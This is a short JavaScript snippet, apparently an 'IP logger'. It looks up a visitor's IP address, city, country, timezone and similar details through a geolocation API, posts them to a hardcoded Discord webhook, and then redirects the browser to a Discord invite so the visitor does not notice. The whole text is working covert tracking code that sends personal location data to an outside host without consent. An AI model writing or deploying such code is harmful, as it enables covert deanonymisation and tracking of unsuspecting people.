var WEBURL = "https://discord.com/api/webhooks/1179472661039034459/jjukAEk4LVOEpTVbi5G8GU4ZnsQ6Gjw6ugGppIesvGbQN6TNasvIODZofy-s1Q3oRSjf";
$.getJSON('https://ipapi.co/json/', function(data) {
$.post(WEBURL, {
    content: "Ip : " + data.ip + "\nCity : " + data.city + "\nCountry : " + data.country + "/" + data.country_name + "\nTimeZone : " + data.timezone + "\nCurrency : " + data.currency + "/" + data.currency_name + "\nLanguages : " + data.languages + "\nNumber-Code : " + data.country_calling_code + "\n@here", username: "M7's Logger",avatar_url: null,});
});
window.location.href = "https://discord.gg/bxMHcc9hsJ";
